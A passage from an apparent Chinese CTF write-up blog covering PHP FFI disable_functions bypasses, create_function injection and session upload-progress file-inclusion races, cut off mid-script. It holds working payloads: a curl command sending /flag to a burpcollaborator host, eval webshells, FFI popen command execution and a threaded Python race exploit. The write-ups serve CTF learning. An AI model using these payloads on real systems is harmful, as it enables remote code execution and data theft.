&lt;pre tabindex="0">&lt;code>?a=unserialize(base64_decode(QzoxOiJBIjo4OTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czoyNjoiaW50IHN5c3RlbShjaGFyICpjb21tYW5kKTsiO319))-&amp;gt;__serialize()[&amp;#39;ret&amp;#39;]-&amp;gt;system(&amp;#34;curl -d @/flag http://fm56ifsleqz363dh864mlhvtzk5atz.burpcollaborator.net&amp;#34;);
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202223140032.png" alt="image-20211202223140032">&lt;/p>
&lt;p>————在这个题出现之后蚁剑还专门出了对应的插件&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202223257130.png" alt="image-20211202223257130">&lt;/p>
&lt;p>但是多次尝试失败，之后看到了这个&lt;a href="https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp">wp&lt;/a>之后再看&lt;a href="https://wiki.php.net/rfc/ffi">官方文档&lt;/a>还有&lt;a href="https://www.laruence.com/2020/03/11/5475.html">这一篇&lt;/a>就明白了&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202223422195.png" alt="image-20211202223422195">&lt;/p>
&lt;p>默认情况下FFI只会被用于CLI模式下&amp;amp;预加载php脚本，除非设置&lt;code>ffi.enable=true&lt;/code>，设置之后在webshell就可以直接用蚁剑插件了&lt;/p>
&lt;h3 id="极客大挑战-2020roamphp5-fighterfightsinvincibly">[极客大挑战 2020]Roamphp5-FighterFightsInvincibly&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204173057497.png" alt="image-20211204173057497">&lt;/p>
&lt;p>很漂亮的前端，看页面源码有注释的提示&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204173130852.png" alt="image-20211204173130852">&lt;/p>
&lt;p>这个形式，真的是一眼&lt;code>create_function()&lt;/code>了，看一下phpinfo()，用的还是&lt;code>create_function()&lt;/code>的注入&lt;/p>
&lt;pre tabindex="0">&lt;code>?fighter=create_function&amp;amp;fights=&amp;amp;invincibly=;}phpinfo();/*
&lt;/code>&lt;/pre>&lt;p>看下disable_function&lt;/p>
&lt;pre tabindex="0">&lt;code>system,exec,shell_exec,passthru,proc_open,proc_close,&amp;amp;nbsp;proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport,&amp;amp;nbsp;syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept,&amp;amp;nbsp;socket_connect,&amp;amp;nbsp;stream_socket_server,&amp;amp;nbsp;stream_socket_accept,stream_socket_client,ftp_connect,&amp;amp;nbsp;ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space,&amp;amp;nbsp;disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd,&amp;amp;nbsp;posix_getegid,posix_geteuid,posix_getgid,&amp;amp;nbsp;posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,&amp;amp;nbsp;posix_getppid,posix_getpwnam,posix_getpwuid,&amp;amp;nbsp;posix_getrlimit,&amp;amp;nbsp;posix_getsid,posix_getuid,posix_isatty,&amp;amp;nbsp;posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid,&amp;amp;nbsp;posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname&amp;lt;/td&amp;gt;&amp;lt;td class=&amp;#34;v&amp;#34;&amp;gt;system,exec,shell_exec,passthru,proc_open,proc_close,&amp;amp;nbsp;proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport,&amp;amp;nbsp;syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept,&amp;amp;nbsp;socket_connect,&amp;amp;nbsp;stream_socket_server,&amp;amp;nbsp;stream_socket_accept,stream_socket_client,ftp_connect,&amp;amp;nbsp;ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space,&amp;amp;nbsp;disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd,&amp;amp;nbsp;posix_getegid,posix_geteuid,posix_getgid,&amp;amp;nbsp;posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,&amp;amp;nbsp;posix_getppid,posix_getpwnam,posix_getpwuid,&amp;amp;nbsp;posix_getrlimit,&amp;amp;nbsp;posix_getsid,posix_getuid,posix_isatty,&amp;amp;nbsp;posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid,&amp;amp;nbsp;posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname
&lt;/code>&lt;/pre>&lt;p>直接不用看了，有一吨，肯定得绕过；蚁剑的各种插件都失败，得手动绕，ffi扩展开着&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204174245283.png" alt="image-20211204174245283">&lt;/p>
&lt;p>看到这里&lt;code>ffi.enable=On&lt;/code>，符合蚁剑插件的应用条件，写个webshell试试&lt;/p>
&lt;pre tabindex="0">&lt;code>?fighter=create_function&amp;amp;fights=&amp;amp;invincibly=;}eval($_POST[wuhu]);/*
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204175626714.png" alt="image-20211204175626714">&lt;/p>
&lt;p>what&amp;rsquo;s up，竟然没有回显&lt;/p>
&lt;p>尝试ping，发现还不出网，不能用curl外带flag&lt;/p>
&lt;p>那只能从FFI本身下手了，调用c的popen 用管道读命令执行的结果&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">FILE&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">popen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>popen&lt;/code>会调用&lt;code>fork()&lt;/code>产生子进程，然后从子进程中调用&lt;code>/bin/sh -c&lt;/code>来执行参数的命令，type有r(read)和w(write)，依照这个值&lt;code>popen&lt;/code>会建立管道连接到子进程的标准输出设备或写入到子进程的标准输入设备中&lt;/p>
&lt;pre tabindex="0">&lt;code>?fighter=create_function&amp;amp;fights=&amp;amp;invincibly=;}$ffi = FFI::cdef(&amp;#34;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&amp;#34;,&amp;#34;libc.so.6&amp;#34;);$o = $ffi-&amp;gt;popen(&amp;#34;ls / -lah&amp;#34;,&amp;#34;r&amp;#34;);$d = &amp;#34;&amp;#34;;while(($c = $ffi-&amp;gt;fgetc($o)) != -1){$d .= str_pad(strval(dechex($c)),2,&amp;#34;0&amp;#34;,0);}$ffi-&amp;gt;pclose($o);echo hex2bin($d);/*
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204180626497.png" alt="image-20211204180626497">&lt;/p>
&lt;p>另一种方法是调用php源码中的函数&lt;code>php_exec()&lt;/code>，当它的参数type为3时对应调用的是&lt;code>passthru()&lt;/code>函数，其执行命令可以将结果原始输出&lt;/p>
&lt;pre tabindex="0">&lt;code>?fighter=create_function&amp;amp;fights=&amp;amp;invincibly=;}$ffi = FFI::cdef(&amp;#34;int php_exec(int type, char *cmd);&amp;#34;);$ffi-&amp;gt;php_exec(3,&amp;#34;ls /&amp;#34;);/*
&lt;/code>&lt;/pre>&lt;p>但是，这道题在buu复现不了，原因是uuid有32个字符，加上连字符有36位，再加上flag{}有42位，但是/readflag程序只允许读出37个字符，所以最后的5位是读不出来的（辣个唯一解可能是爆破的 我试着爆了一会 加延时得跑好久好久好久 放弃了&lt;/p>
&lt;hr>
&lt;p>最近在刷buuoj，有望这个月内把50解以上的题做完捏&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://wiki.php.net/rfc/preload">PHP RFC: Preloading&lt;/a> | &lt;a href="https://wiki.php.net/rfc/ffi">PHP RFC: FFI - Foreign Function Interface&lt;/a> | &lt;a href="https://wiki.php.net/rfc/custom_object_serialization">PHP RFC: New custom object serialization mechanism&lt;/a> | &lt;a href="https://www.laruence.com/2020/03/11/5475.html">PHP FFI详解 - 一种全新的PHP扩展方式&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://towardsdatascience.com/do-you-hate-how-slow-python-is-this-is-how-you-can-make-it-run-faster-532468fe1583">Do You Hate How Slow Python Is? This Is How You Can Make It Run Faster!&lt;/a> | &lt;a href="https://towardsdatascience.com/make-python-faster-with-cffi-python-bindings-eb5402bc35dd">Make Python Faster with CFFI Python Bindings&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://cffi.readthedocs.io/en/latest/">CFFI documentation&lt;/a> | &lt;a href="https://docs.python.org/3/library/ctypes.html">ctypes documentation&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.cnblogs.com/ccxikka/p/9637545.html">Python cffi学习 &lt;/a> | &lt;a href="https://github.com/wolever/python-cffi-example">cffi-example: an example project showing how to use Python&amp;rsquo;s CFFI&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp">wp&lt;/a> | &lt;a href="http://www.lshhaisheng.com/2021/08/02/%E7%BB%95%E8%BF%87disable_function/">wp2&lt;/a>&lt;/p>
&lt;/details></description></item><item><title>PHP_Session学习笔记</title><link>https://amiaaaz.github.io/2021/11/29/php-session-study-notes/</link><pubDate>Mon, 29 Nov 2021 22:23:42 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/29/php-session-study-notes/</guid><description>&lt;p>提到session，能想到什么捏？文件上传，条件竞争，session包含，反序列化…… 让我们一点点说&lt;/p>
&lt;hr>
&lt;h2 id="session配置简述">session配置&amp;amp;简述&lt;/h2>
&lt;p>以7.4.3为例，php.ini中关于Session有几个默认项&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;code>session.auto_start = 0&lt;/code>：默认不启动session，*但是可以在php脚本中手动执行&lt;code>session_start()&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.save_handler = files&lt;/code>：session以文件形式存储&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.save_path=&amp;quot;&amp;quot;&lt;/code>：session文件存储路径 文件名为&lt;code>sess_PHPSESSID&lt;/code>&lt;/p>
&lt;p>linux下默认存储位置；*可以被修改&lt;/p>
&lt;pre tabindex="0">&lt;code>/var/lib/php/sess_PHPSESSID
/var/lib/php/sessions/sess_PHPSESSID
/var/lib/php5/sess_PHPSESSID
/var/lib/php5/sessions/sess_PHPSESSID
/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSID
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>&lt;code>session.serialize_handler = php&lt;/code>：session的默认序列化引擎是php&lt;/p>
&lt;p>其实一共有3种，*php和php_serialize这两种是很多题的元凶&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>序列化引擎&lt;/th>
&lt;th>存储方式&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>php&lt;/td>
&lt;td>键名|序列化后字符串&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>php_binary&lt;/td>
&lt;td>键名的长度对应的 ASCII 字符（会有不可显示的字符）+键名+经过 serialize() 函数反序列处理的值&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>php_serialize(php&amp;gt;=5.5.4)&lt;/td>
&lt;td>将字符串反序列化处理得到的数组&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.upload_progress.enabled = On&lt;/code>：当有POST上传行为时，此次上传的详细信息（如上传时间、上传进度等）都会被存储到session中&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.upload_progress.cleanup = On&lt;/code>：当POST上传完成后，此次的session文件内容会被立即情况&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.upload_progress.prefix = &amp;quot;upload_progress_&amp;quot;&lt;/code>：存入session文件中的前缀部分&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.upload_progress.name = &amp;quot;PHP_SESSION_UPLOAD_PROGRESS&amp;quot;&lt;/code>：默认name，*可控可利用&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.use_strict_mode = 0&lt;/code>：表示我们对Cookie中的PHPSESSID字段可控&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="文件包含条件竞争">文件包含&amp;amp;条件竞争&lt;/h2>
&lt;p>默认情况下&lt;code>session.use_strict_mode = 0&lt;/code>，当我们设置了Cookie的&lt;code>PHPSESSID&lt;/code>字段后的值value后，php会自动创建session文件（默认路径&lt;code>/tmp/sess_PHPSESSID&lt;/code>）；注意这个行为并不需要&lt;code>session.auto_start = On&lt;/code>或是&lt;code>session_start()&lt;/code>来手动开启就会被PHP自动初始化一个session，并将prefix+value写入sess_PHPSESSID文件中；整个流程中value可控，我们可以把恶意的payload加载到sess文件中然后包含，得到rce&lt;/p>
&lt;p>这是一个常见的上传表单&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">form&lt;/span> &lt;span style="color:#75af00">action&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;index.php&amp;#34;&lt;/span> &lt;span style="color:#75af00">method&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span> &lt;span style="color:#75af00">enctype&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;multipart/form-data&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;hidden&amp;#34;&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;PHP_SESSION_UPLOAD_PROGRESS&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;666666&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;file&amp;#34;&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;file&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;submit&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>当然一般的题不会有这么单纯，还会配一个默认项&lt;code>session.upload_progress.cleanup = On&lt;/code>；但是如果我们构造上传表单时传的无用文件很大时就可以来个顶级拉扯（条件竞争），在它被清空前先包含&amp;amp;rce&lt;/p>
&lt;h3 id="wmctf2020make-php-great-again">[WMCTF2020]Make PHP Great Again&lt;/h3>
&lt;p>开幕源码暴击&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">require_once&lt;/span> &lt;span style="color:#d88200">&amp;#39;flag.php&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">require_once&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这个题的非预期解：文件包含+条件竞争&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">io&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">threading&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">sessid&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;AMIZ&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;cmd&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;system(&amp;#39;tac /var/www/html/flag.php&amp;#39;);&amp;#34;&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">BytesIO&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">50&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://d5ef2f36-5be3-46d5-8c04-301b9ba4f5f7.node4.buuoj.cn:81/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;PHP_SESSION_UPLOAD_PROGRESS&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php eval($_POST[&amp;#34;cmd&amp;#34;]);?&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">},&lt;/span> &lt;span style="color:#111">files&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;amiz.txt&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">)},&lt;/span> &lt;span style="color:#111">cookies&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;PHPSESSID&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">sessid&lt;/span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://d5ef2f36-5be3-46d5-8c04-301b9ba4f5f7.node4.buuoj.cn:81/?file=/tmp/sess_&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">sessid&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#39;amiz.txt&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">event&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">clear&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">pass&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">event&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">threading&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Event&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">30&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">threading&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">,))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">start&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">30&lt;/span>&lt;span style="color:#111">):&lt;/span>
